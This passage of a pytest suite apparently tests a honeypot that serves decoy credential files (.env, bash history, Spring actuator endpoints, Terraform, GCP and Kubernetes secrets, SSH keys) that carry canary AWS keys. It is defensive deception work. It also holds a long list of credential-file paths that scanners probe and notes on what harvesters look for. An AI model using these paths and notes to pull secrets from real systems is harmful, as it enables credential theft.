    # we substitute a per-hit random value instead. Assert the old literal is
    # gone AND that two renders produce different passwords.
    trap = tbenv._TRAP_BY_PATH[path]
    body_1 = trap.render(FAKE_TRACEBIT)
    body_2 = trap.render(FAKE_TRACEBIT)
    for fingerprint in (b"h6T!9pq2Wz@LmRnV", b"h6T!9pq2Wz"):
        assert fingerprint not in body_1, f"{path!r} still embeds fixed DB password literal"
    # Passwords generated from secrets.token_urlsafe(16) are ~22 chars — the
    # rendered bodies should differ somewhere. (Same AWS canary mock is used
    # for both, so anything that varies is necessarily the DB password.)
    assert body_1 != body_2, f"{path!r} renders identically across calls — password not randomized"


@pytest.mark.parametrize("path,svc_marker", [
    ("/sendgrid/.env", b"SENDGRID_API_KEY=SG."),
    ("/postmark/.env", b"POSTMARK_SERVER_TOKEN="),
    ("/mailjet/.env", b"MJ_APIKEY_PUBLIC="),
    ("/brevo/.env", b"BREVO_API_KEY=xkeysib-"),
    ("/mailgun/.env", b"MAILGUN_API_KEY=key-"),
])
def test_mail_service_env_renders_service_specific_key(path, svc_marker):
    trap = tbenv._TRAP_BY_PATH[path]
    body = trap.render(FAKE_TRACEBIT)
    assert svc_marker in body, f"{path} should contain {svc_marker!r}"
    assert b"AWS_ACCESS_KEY_ID=" in body, f"{path} should also embed AWS canary"
    assert b"SMTP_HOST=" in body, f"{path} should contain SMTP config"
    assert b"DATABASE_URL=" in body, f"{path} should contain DB URL"


def test_mail_service_env_paths_produce_different_content():
    sendgrid_trap = tbenv._TRAP_BY_PATH["/sendgrid/.env"]
    postmark_trap = tbenv._TRAP_BY_PATH["/postmark/.env"]
    sg_body = sendgrid_trap.render(FAKE_TRACEBIT)
    pm_body = postmark_trap.render(FAKE_TRACEBIT)
    assert b"SENDGRID_API_KEY" in sg_body
    assert b"POSTMARK_SERVER_TOKEN" in pm_body
    assert b"SENDGRID_API_KEY" not in pm_body
    assert b"POSTMARK_SERVER_TOKEN" not in sg_body


@pytest.mark.parametrize("path", [
    "/yarn.lock",
    "/yarn.lock.bak",
    "/package-lock.json",
    "/package-lock.json.bak",
    "/var/backups/npm/package-lock.json.old",
])
def test_node_deps_lockfiles_have_per_hit_unique_integrity(path):
    # Each render synthesises a fresh sha512 integrity hash per package
    # (`_fake_npm_integrity()`); two adjacent renders on different sensors
    # would otherwise share the same lockfile body and turn the fleet into
    # a single fingerprint. Same rule as the wp-config DB-password
    # regression — credential-shaped fields stay per-hit unique.
    trap = tbenv._TRAP_BY_PATH[path]
    body_1 = trap.render(FAKE_TRACEBIT)
    body_2 = trap.render(FAKE_TRACEBIT)
    assert b"sha512-" in body_1, f"{path!r} should embed sha512- integrity hashes"
    assert body_1 != body_2, f"{path!r} renders identically across calls — integrity not randomized"


def test_htpasswd_renders_bcrypt_shape_with_canary_username():
    body = tbenv.render_htpasswd(FAKE_TRACEBIT).decode("utf-8")
    lines = body.strip().splitlines()
    assert len(lines) == 3
    users = [ln.split(":", 1)[0] for ln in lines]
    assert users == ["deploybot42", "admin", "backup"]
    for ln in lines:
        user, hash_ = ln.split(":", 1)
        # `$2y$10$` prefix + 53 chars (22 salt + 31 digest) = 60 total
        assert hash_.startswith("$2y$10$"), f"hash for {user!r} not bcrypt-shaped: {hash_!r}"
        assert len(hash_) == 60, f"hash for {user!r} wrong length: {len(hash_)}"


def test_htpasswd_hash_is_per_hit_unique():
    # Two consecutive renders must produce different hashes — a fleet-wide
    # fixed `$2y$10$...` literal would turn the file into a single
    # fingerprint across every sensor, the same regression that hit
    # wp-config / phpinfo / .env.production in April 2026.
    body_1 = tbenv.render_htpasswd(FAKE_TRACEBIT)
    body_2 = tbenv.render_htpasswd(FAKE_TRACEBIT)
    assert body_1 != body_2, "htpasswd hashes are not per-hit unique"


def test_render_bash_history_embeds_canary_export_block():
    body = tbenv.render_bash_history(FAKE_TRACEBIT).decode("utf-8")
    assert "export AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01" in body
    assert "export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body
    assert "export AWS_SESSION_TOKEN=FwoGZXIvYXdzEXAMPLEFAKE=" in body
    # The believability hinge: the canary export trio is followed by an
    # `aws ...` invocation, so harvesters that parse for "command after
    # export" still pick the canary up.
    assert "aws sts get-caller-identity" in body
    assert "aws s3 cp" in body


def test_render_bash_history_is_per_hit_unique():
    # Two adjacent renders must differ — the renderer randomizes a
    # short commit SHA, a PR number, an SSH jump port, an S3 object
    # key, and the DB password. A fixed body would let scanners
    # cross-sensor fingerprint our fleet.
    body1 = tbenv.render_bash_history(FAKE_TRACEBIT)
    body2 = tbenv.render_bash_history(FAKE_TRACEBIT)
    assert body1 != body2


def test_render_bash_history_does_not_embed_fixed_db_password():
    # Same fleet-fingerprint regression that hit wp-config/application.yml
    # in April 2026 — plaintext DB-password literals must stay per-hit
    # synthetic.
    body1 = tbenv.render_bash_history(FAKE_TRACEBIT).decode("utf-8")
    body2 = tbenv.render_bash_history(FAKE_TRACEBIT).decode("utf-8")
    for fingerprint in ("h6T!9pq2Wz@LmRnV", "h6T!9pq2Wz"):
        assert fingerprint not in body1
    # The two psql/mysql lines carry a per-hit password. Pull them and
    # confirm they differ across renders.
    def _pw(body: str) -> str:
        for line in body.splitlines():
            if "PGPASSWORD='" in line:
                return line.split("PGPASSWORD='", 1)[1].split("'", 1)[0]
        raise AssertionError("no PGPASSWORD line")
    assert _pw(body1) != _pw(body2)


def test_render_zsh_history_uses_extended_history_prefix():
    body = tbenv.render_zsh_history(FAKE_TRACEBIT).decode("utf-8")
    lines = [ln for ln in body.splitlines() if ln]
    assert lines, "zsh history body must not be empty"
    # `: <unix_ts>:<elapsed>;<cmd>` is the zsh EXTENDED_HISTORY shape.
    for ln in lines:
        assert ln.startswith(": "), f"line lacks zsh extended-history prefix: {ln!r}"
        head, _, cmd = ln.partition(";")
        assert cmd, f"line missing command after ';': {ln!r}"
        ts_str, _, elapsed_str = head[2:].partition(":")
        assert ts_str.isdigit() and elapsed_str.isdigit(), f"non-numeric ts/elapsed: {ln!r}"
    # Canary export trio is present in command form.
    assert "export AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01" in body
    assert "aws s3" in body


def test_render_zsh_history_is_per_hit_unique():
    # Per-hit timestamps + db password mean two renders must differ.
    body1 = tbenv.render_zsh_history(FAKE_TRACEBIT)
    body2 = tbenv.render_zsh_history(FAKE_TRACEBIT)
    assert body1 != body2


@pytest.mark.parametrize("path", [
    "/.bash_history",
    "/root/.bash_history",
    "/home/ubuntu/.bash_history",
    "/home/ec2-user/.bash_history",
    "/home/node/.bash_history",
    "/@fs/root/.bash_history",
    "/@fs/home/node/.bash_history",
])
async def test_dispatch_routes_bash_history_variants_to_trap(flux_client, monkeypatch, path):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.42"})
    assert resp.status == 200
    assert resp.headers["Content-Type"] == "text/plain; charset=utf-8"
    body = await resp.read()
    assert b"export AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "bash-history"


@pytest.mark.parametrize("path", [
    "/.zsh_history",
    "/root/.zsh_history",
    "/home/node/.zsh_history",
    "/@fs/root/.zsh_history",
])
async def test_dispatch_routes_zsh_history_variants_to_trap(flux_client, monkeypatch, path):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.43"})
    assert resp.status == 200
    body = await resp.read()
    assert b"export AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "zsh-history"


def test_render_vite_env_embeds_canary_in_flat_define_block():
    # The real Vite client at `/@vite/env` emits a JS module whose
    # `context.define` is a flat-key dict like `{"import.meta.env.MODE":
    # "production", "import.meta.env.VITE_API_KEY": "..."}`. Scanners
    # grep raw bytes for `VITE_*` / `AWS_*` / `AKIA` so the canary must
    # show up in both `VITE_AWS_*` slots and the bare `VITE_API_KEY`
    # slot (some dictionaries only key on the latter).
    body = tbenv.render_vite_env(FAKE_TRACEBIT).decode("utf-8")
    assert "context.define" in body
    assert '"import.meta.env.VITE_API_KEY":"AKIAFAKEEXAMPLE01"' in body
    assert '"import.meta.env.VITE_AWS_ACCESS_KEY_ID":"AKIAFAKEEXAMPLE01"' in body
    assert (
        '"import.meta.env.VITE_AWS_SECRET_ACCESS_KEY":'
        '"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"' in body
    )
    assert (
        '"import.meta.env.VITE_AWS_SESSION_TOKEN":'
        '"FwoGZXIvYXdzEXAMPLEFAKE="' in body
    )
    assert '"import.meta.env.MODE":"production"' in body


def test_render_vite_env_is_per_hit_unique():
    # Per-hit `VITE_APP_ID`, `VITE_S3_BUCKET` suffix, and `VITE_SENTRY_DSN`
    # project/org/public-key vary across renders so the response body
    # can't be cross-sensor fingerprinted.
    body1 = tbenv.render_vite_env(FAKE_TRACEBIT)
    body2 = tbenv.render_vite_env(FAKE_TRACEBIT)
    assert body1 != body2


def test_render_vite_env_does_not_embed_fixed_synthetic_secret():
    # Per-hit synthetic Sentry public key must differ between renders —
    # a hardcoded literal here would fingerprint the fleet by sharing
    # the same string across every sensor (the same regression that hit
    # wp-config / application.yml in April 2026).
    def _sentry_key(body: bytes) -> str:
        text = body.decode("utf-8")
        marker = "VITE_SENTRY_DSN"
        assert marker in text
        # "...VITE_SENTRY_DSN":"https://<pubkey>@o<org>.ingest.sentry.io/<proj>"
        dsn = text.split(marker, 1)[1].split('"', 3)[2]
        assert dsn.startswith("https://"), dsn
        return dsn.split("https://", 1)[1].split("@", 1)[0]
    a = _sentry_key(tbenv.render_vite_env(FAKE_TRACEBIT))
    b = _sentry_key(tbenv.render_vite_env(FAKE_TRACEBIT))
    assert a != b


async def test_dispatch_routes_vite_env_to_trap(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/@vite/env",
        headers={"X-Forwarded-For": "203.0.113.44"},
    )
    assert resp.status == 200
    assert resp.headers["Content-Type"] == "application/javascript; charset=utf-8"
    body = await resp.read()
    assert b"AKIAFAKEEXAMPLE01" in body
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "vite-env"


async def test_vite_env_404s_without_api_key(flux_client, monkeypatch):
    # Keyless deployments must 404 the canary-backed paths — dispatch
    # requires `TRACEBIT_API_KEY` on top of `CANARY_TRAPS_ENABLED`.
    monkeypatch.setattr(tbenv, "API_KEY", "")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)

    resp = await flux_client.get(
        "/@vite/env",
        headers={"X-Forwarded-For": "203.0.113.45"},
    )
    assert resp.status == 404


def test_htpasswd_falls_back_to_default_username_when_tracebit_missing():
    # Canary issuance can fail (quota / network); fall back to the same
    # generic `deploy` user as `.pgpass` rather than an empty username
    # that would make the line parse-invalid.
    body = tbenv.render_htpasswd({}).decode("utf-8")
    first_line = body.splitlines()[0]
    user, hash_ = first_line.split(":", 1)
    assert user == "deploy"
    assert hash_.startswith("$2y$10$")


def test_node_deps_canary_password_falls_back_to_synthetic_when_tracebit_missing():
    # If the Tracebit issuance failed, _node_deps_canary_userinfo falls
    # back to _fake_db_password() — never a fixed literal. This protects
    # against fleet-wide fingerprinting when canary minting hits a quota
    # ceiling.
    user_a, pw_a, host_a = tbenv._node_deps_canary_userinfo({})
    user_b, pw_b, host_b = tbenv._node_deps_canary_userinfo({})
    assert host_a == host_b == "npm.internal-tools.lan"
    assert user_a == user_b == "deploy"
    assert pw_a and pw_b, "fallback password must not be empty"
    assert pw_a != pw_b, "fallback password must be per-call unique"


def test_ssh_config_and_known_hosts_return_empty_when_ssh_missing():
    # If Tracebit didn't return an ssh block (e.g. the handler was asked
    # for aws-only by mistake), the config/known_hosts traps must render
    # an empty body rather than spraying a truncated IdentityFile stub or
    # a bare ``ssh-ed25519 AAAA`` line with no host.
    for r in ({"aws": {}}, {}, {"ssh": None}, {"ssh": {}}):
        assert tbenv.render_ssh_config(r) == b""
        assert tbenv.render_known_hosts(r) == b""


def test_ssh_renderers_base64_decode_tracebit_values():
    # Tracebit Community returns sshPrivateKey / sshPublicKey as base64
    # over the on-wire JSON. If flux serves the base64 verbatim on /id_rsa
    # an attacker running `ssh -i stolen_id_rsa` gets "invalid format" and
    # the canary never fires — which matches the dashboard reality of ~5
    # SSH canaries ever issued despite ~700 SSH-path hits/30d. Lock in the
    # decode so a future edit can't silently regress it.
    real_priv = "-----BEGIN OPENSSH PRIVATE KEY-----\nABC123\n-----END OPENSSH PRIVATE KEY-----\n"
    real_pub = "ssh-ed25519 AAAAC3Nza... canary@flux\n"
    response = {
        "ssh": {
            "sshPrivateKey": base64.b64encode(real_priv.encode()).decode(),
            "sshPublicKey": base64.b64encode(real_pub.encode()).decode(),
        },
    }
    assert tbenv.render_ssh_private_key(response).startswith(b"-----BEGIN OPENSSH PRIVATE KEY-----")
    assert tbenv.render_ssh_public_key(response).startswith(b"ssh-ed25519 ")
    assert b"ssh-ed25519 " in tbenv.render_authorized_keys(response)
    # ``format_env_payload`` deliberately names its env var ``_B64`` and
    # ships the raw base64 — scanners that exfil the line can decode it
    # themselves, and we don't want to double-decode.
    env_body = tbenv.format_env_payload(response)
    assert f"SSH_PRIVATE_KEY_B64={response['ssh']['sshPrivateKey']}" in env_body


def test_ssh_renderers_fallback_when_value_is_raw_pem():
    # Defensive: if the upstream format ever flips back to raw PEM
    # (or the fixture in tests passes PEM, as some older tests do), a
    # PEM string isn't valid base64 — the decoder falls through to the
    # raw value rather than exploding.
    response = {
        "ssh": {
            "sshPrivateKey": "-----BEGIN OPENSSH PRIVATE KEY-----\nFAKEKEY\n-----END OPENSSH PRIVATE KEY-----",
            "sshPublicKey": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKE canary@flux",
        },
    }
    assert b"BEGIN OPENSSH PRIVATE KEY" in tbenv.render_ssh_private_key(response)
    assert b"ssh-ed25519 AAAA" in tbenv.render_ssh_public_key(response)
    assert b"ssh-ed25519 AAAA" in tbenv.render_authorized_keys(response)


def test_render_env_production_database_url_is_parseable():
    # The DB password is random per hit and gets inlined into a postgres://
    # userinfo component. It must stay parseable so the rendered .env is
    # credible — secrets.token_urlsafe uses only [A-Za-z0-9_-], none of
    # which need percent-encoding inside URL userinfo.
    from urllib.parse import urlsplit
    body = tbenv.render_env_production(FAKE_TRACEBIT).decode("utf-8")
    db_line = next(line for line in body.splitlines() if line.startswith("DATABASE_URL="))
    parsed = urlsplit(db_line.split("=", 1)[1])
    assert parsed.scheme == "postgresql"
    assert parsed.username == "prod_rw"
    assert parsed.password  # non-empty
    assert parsed.hostname == "db.internal"


def test_render_actuator_env_json_is_valid_and_per_hit_unique():
    # The actuator /env response MUST parse as JSON (scanners filter on shape)
    # and MUST embed a per-hit DB password — a fixed literal would fingerprint
    # every sensor identically (see the README "per-hit and Tracebit-backed"
    # design principle).
    body1 = tbenv.render_actuator_env_json(FAKE_TRACEBIT).decode("utf-8")
    payload = json.loads(body1)
    assert payload["activeProfiles"] == ["production"]
    sources = {s["name"]: s for s in payload["propertySources"]}
    assert "systemEnvironment" in sources
    assert sources["systemEnvironment"]["properties"]["AWS_ACCESS_KEY_ID"]["value"] \
        == "AKIAFAKEEXAMPLE01"
    app_source = next(s for name, s in sources.items() if name.startswith("applicationConfig"))
    pw1 = app_source["properties"]["spring.datasource.password"]["value"]
    assert pw1, "password must not be empty"
    # Second call mints a new synthetic password — never reused.
    body2 = tbenv.render_actuator_env_json(FAKE_TRACEBIT).decode("utf-8")
    pw2 = json.loads(body2)["propertySources"][2]["properties"]["spring.datasource.password"]["value"]
    assert pw1 != pw2


def test_render_actuator_configprops_is_valid_and_per_hit_unique():
    body1 = tbenv.render_actuator_configprops(FAKE_TRACEBIT).decode("utf-8")
    payload = json.loads(body1)
    beans = payload["contexts"]["application"]["beans"]
    ds = beans["spring.datasource-org.springframework.boot.autoconfigure.jdbc.DataSourceProperties"]
    assert ds["prefix"] == "spring.datasource"
    pw1 = ds["properties"]["password"]
    assert pw1
    aws_bean = beans["cloud.aws-org.springframework.cloud.aws.core.region.StaticRegionProvider"]
    assert aws_bean["properties"]["accessKey"] == "AKIAFAKEEXAMPLE01"
    body2 = tbenv.render_actuator_configprops(FAKE_TRACEBIT).decode("utf-8")
    pw2 = json.loads(body2)["contexts"]["application"]["beans"][
        "spring.datasource-org.springframework.boot.autoconfigure.jdbc.DataSourceProperties"
    ]["properties"]["password"]
    assert pw1 != pw2


def test_render_actuator_health_is_valid_and_per_hit_unique():
    body1 = tbenv.render_actuator_health(FAKE_TRACEBIT).decode("utf-8")
    payload = json.loads(body1)
    assert payload["status"] == "UP"
    db_url1 = payload["components"]["db"]["details"]["url"]
    assert db_url1.startswith("jdbc:postgresql://prod_rw:")
    redis_url1 = payload["components"]["redis"]["details"]["url"]
    body2 = tbenv.render_actuator_health(FAKE_TRACEBIT).decode("utf-8")
    p2 = json.loads(body2)
    assert p2["components"]["db"]["details"]["url"] != db_url1
    assert p2["components"]["redis"]["details"]["url"] != redis_url1


def test_render_actuator_mappings_is_valid_json():
    body = tbenv.render_actuator_mappings(FAKE_TRACEBIT).decode("utf-8")
    payload = json.loads(body)
    handlers = payload["contexts"]["application"]["mappings"]["dispatcherServlets"]["dispatcherServlet"]
    # Webhook handler embeds the canary access key id in the URL pattern.
    assert any("AKIAFAKEEXAMPLE01" in h.get("predicate", "") for h in handlers)


def test_render_actuator_threaddump_is_valid_json():
    body = tbenv.render_actuator_threaddump(FAKE_TRACEBIT).decode("utf-8")
    payload = json.loads(body)
    assert any(
        "AKIAFAKEEXAMPLE01" in t.get("threadName", "")
        for t in payload["threads"]
    ), "at least one thread name must carry the canary access key id"
    # Every thread MUST have the threadState field — scanners filter on shape.
    assert all("threadState" in t for t in payload["threads"])


def test_render_actuator_heapdump_carries_canary_in_raw_bytes():
    body = tbenv.render_actuator_heapdump(FAKE_TRACEBIT)
    # Heap dump harvesters grep raw bytes for AKIA / AWS_SECRET_ACCESS_KEY.
    assert b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01" in body
    assert b"AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI" in body
    # HPROF magic header so a content-sniffer accepts the response.
    assert body.startswith(b"JAVA PROFILE 1.0.2\x00")
    # Subsequent calls embed a different DB password (per-hit unique).
    other = tbenv.render_actuator_heapdump(FAKE_TRACEBIT)
    assert other != body


def test_render_actuator_logfile_carries_canary_and_per_hit_unique():
    body1 = tbenv.render_actuator_logfile(FAKE_TRACEBIT).decode("utf-8")
    # Grep-style harvest pattern — the same one heapdump tests assert.
    assert "AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01" in body1
    assert "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI" in body1
    # JDBC URL with embedded password — per-hit synthetic, never a fixed literal.
    import re
    m = re.search(r"jdbc:postgresql://prod_rw:([^@]+)@db\.internal", body1)
    assert m, "logfile must embed a JDBC URL with the per-hit DB password"
    pw1 = m.group(1)
    body2 = tbenv.render_actuator_logfile(FAKE_TRACEBIT).decode("utf-8")
    pw2 = re.search(r"jdbc:postgresql://prod_rw:([^@]+)@db\.internal", body2).group(1)
    assert pw1 != pw2, "DB password must be per-hit unique"


def test_render_actuator_jolokia_list_is_valid_and_carries_canary():
    body = tbenv.render_actuator_jolokia_list(FAKE_TRACEBIT).decode("utf-8")
    payload = json.loads(body)
    # Jolokia v1 response shape — scanners filter on these fields.
    assert payload["status"] == 200
    assert payload["request"] == {"type": "list"}
    assert "value" in payload
    # DiagnosticCommand MBean — the JMX RCE primitive scanners chase.
    diag = payload["value"]["com.sun.management"]["type=DiagnosticCommand"]
    assert "vmCommandLine" in diag["op"]
    # AWS canary embedded in the Runtime MBean's InputArguments description.
    runtime = payload["value"]["java.lang"]["type=Runtime"]
    assert "AKIAFAKEEXAMPLE01" in runtime["attr"]["InputArguments"]["desc"]
    assert "AKIAFAKEEXAMPLE01" in runtime["attr"]["SystemProperties"]["desc"]


def test_render_actuator_flyway_is_valid_and_carries_canary():
    body = tbenv.render_actuator_flyway(FAKE_TRACEBIT).decode("utf-8")
    payload = json.loads(body)
    migrations = payload["contexts"]["application"]["flywayBeans"]["flyway"]["migrations"]
    # Init migration's description leaks the canary AWS access key id.
    assert any(
        "AKIAFAKEEXAMPLE01" in m.get("description", "") for m in migrations
    ), "at least one migration must carry the canary in its description"
    # Per-hit DB password — never a fixed literal across two renders.
    import re
    m1 = re.search(r"db password='([^']+)'", body)
    assert m1, "init migration must embed a per-hit DB password"
    body2 = tbenv.render_actuator_flyway(FAKE_TRACEBIT).decode("utf-8")
    m2 = re.search(r"db password='([^']+)'", body2)
    assert m1.group(1) != m2.group(1), "DB password must be per-hit unique"


def test_render_actuator_scheduledtasks_is_valid_and_carries_canary():
    body = tbenv.render_actuator_scheduledtasks(FAKE_TRACEBIT).decode("utf-8")
    payload = json.loads(body)
    # Spring 2.x scheduledtasks shape — scanners filter on these buckets.
    for bucket in ("cron", "fixedDelay", "fixedRate", "custom"):
        assert bucket in payload
    # Canary in the WebhookPoller task target URL.
    targets = [c["runnable"]["target"] for c in payload["cron"]]
    assert any("AKIAFAKEEXAMPLE01" in t for t in targets)


def test_render_actuator_refresh_is_valid_and_carries_canary():
    body = tbenv.render_actuator_refresh(FAKE_TRACEBIT).decode("utf-8")
    payload = json.loads(body)
    # Real /refresh returns a JSON array of property names.
    assert isinstance(payload, list)
    # The list steers the next probe at `/actuator/env` by listing
    # credential-bearing property names.
    assert "spring.datasource.password" in payload
    assert any("AKIAFAKEEXAMPLE01" in p for p in payload)


def test_render_actuator_trace_is_valid_and_carries_canary():
    body = tbenv.render_actuator_trace(FAKE_TRACEBIT).decode("utf-8")
    payload = json.loads(body)
    assert "traces" in payload
    # AWS SigV4 Authorization header on a recent trace carries the access key id.
    auth_headers = []
    for t in payload["traces"]:
        h = t.get("request", {}).get("headers", {})
        if "authorization" in h:
            auth_headers.extend(h["authorization"])
    joined = " ".join(auth_headers)
    assert "AKIAFAKEEXAMPLE01" in joined
    # Webhook URL on one trace carries the access key as a query param.
    uris = [t.get("request", {}).get("uri", "") for t in payload["traces"]]
    assert any("api_key=AKIAFAKEEXAMPLE01" in u for u in uris)


def test_render_gcp_service_account_json_is_valid_and_carries_canary():
    body = tbenv.render_gcp_service_account_json(FAKE_TRACEBIT).decode("utf-8")
    payload = json.loads(body)
    # The first thing a harvester filters on.
    assert payload["type"] == "service_account"
    # AWS canary embedded in the private_key body (idiomatic grep target).
    assert "wJalrXUtnFEMI" in payload["private_key"]
    # Required GCP-shape fields so SDK validators accept the file.
    for field_name in ("project_id", "private_key_id", "client_email", "token_uri"):
        assert payload[field_name], f"required field {field_name} missing"
    # private_key_id is shaped like a 40-char lowercase hex
    assert len(payload["private_key_id"]) == 40
    assert payload["private_key_id"] == payload["private_key_id"].lower()


def test_render_terraform_tfvars_carries_canary():
    body = tbenv.render_terraform_tfvars(FAKE_TRACEBIT).decode("utf-8")
    assert 'aws_access_key = "AKIAFAKEEXAMPLE01"' in body
    assert 'aws_secret_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"' in body
    # Per-hit DB password — never a fixed literal.
    import re
    m1 = re.search(r'db_password = "([^"]+)"', body)
    assert m1
    body2 = tbenv.render_terraform_tfvars(FAKE_TRACEBIT).decode("utf-8")
    m2 = re.search(r'db_password = "([^"]+)"', body2)
    assert m1.group(1) != m2.group(1)


def test_render_terraform_tfvars_json_is_valid_json():
    body = tbenv.render_terraform_tfvars_json(FAKE_TRACEBIT).decode("utf-8")
    payload = json.loads(body)
    assert payload["aws_access_key"] == "AKIAFAKEEXAMPLE01"
    assert payload["aws_secret_key"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert payload["db_password"]


def test_render_k8s_secret_manifest_carries_canary_in_both_forms():
    """Secret `data:` block base64-encodes the canary (real Secret shape);
    the Deployment `env:` block ALSO carries it as plaintext so a raw-byte
    grep that skips base64 blobs still finds it. Both must be present."""
    body = tbenv.render_k8s_secret_manifest(FAKE_TRACEBIT).decode("utf-8")
    # Plaintext canary in the Deployment env block.
    assert 'value: "AKIAFAKEEXAMPLE01"' in body
    assert 'value: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"' in body
    # Base64-encoded canary in the Secret data block.
    ak_b64 = base64.b64encode(b"AKIAFAKEEXAMPLE01").decode()
    sk_b64 = base64.b64encode(b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY").decode()
    assert f"AWS_ACCESS_KEY_ID: {ak_b64}" in body
    assert f"AWS_SECRET_ACCESS_KEY: {sk_b64}" in body
    # Multi-document YAML shape — one Secret, one ConfigMap, one Deployment.
    assert body.count("---") >= 3
    assert "kind: Secret" in body
    assert "kind: ConfigMap" in body
    assert "kind: Deployment" in body


def test_render_k8s_secret_manifest_db_password_is_per_hit_unique():
    """DB_PASSWORD in the Secret `data:` block is a per-hit synthetic; two
    consecutive renders must not share the same base64 blob (would let a
    scanner cross-sensor fingerprint the fleet)."""
    def _db(body: str) -> str:
        for line in body.splitlines():
            if "DB_PASSWORD:" in line:
                return line.split(":", 1)[1].strip()
        raise AssertionError("no DB_PASSWORD line in Secret manifest")
    body1 = tbenv.render_k8s_secret_manifest(FAKE_TRACEBIT).decode("utf-8")
    body2 = tbenv.render_k8s_secret_manifest(FAKE_TRACEBIT).decode("utf-8")
    assert _db(body1) != _db(body2)


@pytest.mark.parametrize("path", [
    # actuator-logfile family
    "/actuator/logfile",
    "/manage/logfile",
    "/management/logfile",
    "/api/actuator/logfile",
    "/app/actuator/logfile",
    "/backend/actuator/logfile",
    # actuator-trace family (1.x name + 2.x rename to httptrace)
    "/actuator/trace",
    "/actuator/httptrace",
    "/app/actuator/trace",
    "/backend/actuator/trace",
    "/api/actuator/httptrace",
    # new /app/ + /backend/ prefixes on existing actuator handlers
    "/app/actuator/env",
    "/backend/actuator/env",
    "/app/actuator/heapdump",
    "/backend/actuator/heapdump",
    "/app/actuator/configprops",
    "/backend/actuator/configprops",
    "/app/actuator/health",
    "/backend/actuator/health",
    "/app/actuator/mappings",
    "/backend/actuator/mappings",
    "/app/actuator/threaddump",
    "/backend/actuator/threaddump",
    # terraform-tfvars + .json sibling
    "/terraform.tfvars",
    "/.terraform/terraform.tfvars",
    "/terraform.tfvars.json",
    "/.terraform/terraform.tfvars.json",
    # gcp-credentials-json family
    "/gcp-credentials.json",
    "/config/gcp-credentials.json",
    "/api/credentials.json",
    "/private/credentials.json",
    "/backend/credentials.json",
    "/app/credentials.json",
    # env-production webroot-prefix expansion
    "/backend/.env",
    "/backend/.env.production",
    "/backend/.env.local",
    "/backend/.env.dev",
    "/backend/.env.staging",
    "/api/.env",
    "/api/.env.production",
    "/api/.env.local",
    # /env.* (no leading dot) alias additions
    "/env.bak",
    "/env.txt",
    # phpinfo alias additions (underscore + extensionless + 1-2 char variants)
    "/php_info.php",
    "/phpinfo",
    "/pinfo.php",
    "/i.php",
    "/pi.php",
    # gcp-credentials-json alias additions
    "/.gcp/credentials.json",
    "/google-credentials.json",
    "/service_account.json",
    "/gcp-key.json",
    # aws-credentials-file backup-rotation variants
    "/.aws/credentials.bak",
    "/.aws/credentials.old",
    # terraform-tfstate webroot-prefix variants
    "/terraform/terraform.tfstate",
    "/infra/terraform.tfstate",
    "/infrastructure/terraform.tfstate",
    "/ops/terraform.tfstate",
    # aws-credentials-csv — AWS Console IAM-user-creation download
    # and its scanner-dictionary siblings.
    "/credentials.csv",
    "/aws-credentials.csv",
    "/aws_credentials.csv",
    "/new_user_credentials.csv",
    "/iam-credentials.csv",
    "/iam_credentials.csv",
    "/admin/credentials.csv",
    "/users/credentials.csv",
    "/iam/credentials.csv",
    "/app/credentials.csv",
    "/backend/credentials.csv",
    "/api/credentials.csv",
    "/private/credentials.csv",
    "/backup/credentials.csv",
    # aws-access-keys-csv — two-column "Create access key" download
    # and the deprecated root-account access-key download.
    "/accesskeys.csv",
    "/access_keys.csv",
    "/access-keys.csv",
    "/accesskey.csv",
    "/rootkey.csv",
    "/root_key.csv",
    "/root-key.csv",
    "/aws-access-keys.csv",
    "/aws_access_keys.csv",
    # kubeconfig alias variants (leading-dot, dash-separated, kubectl-file,
    # subdir-prefix, Rancher-download endpoint).
    "/.kubeconfig",
    "/kube-config",
    "/kubectl.yaml",
    "/kubectl.yml",
    "/config/kubeconfig",
    "/admin/kubeconfig",
    "/kubernetes/config",
    "/api/v1/clusters/kubeconfig/k8s",
    # k8s-secret-manifest — Secret / Deployment / ConfigMap YAML paths.
    "/kubernetes.yaml",
    "/kubernetes.yml",
    "/kubernetes/secrets.yaml",
    "/kubernetes/secrets.yml",
    "/kubernetes/secret.yaml",
    "/kubernetes/secret.yml",
    "/kubernetes/deployment.yaml",
    "/kubernetes/deployment.yml",
    "/kubernetes/configmap.yaml",
    "/kubernetes/configmap.yml",
    "/k8s/secrets.yaml",
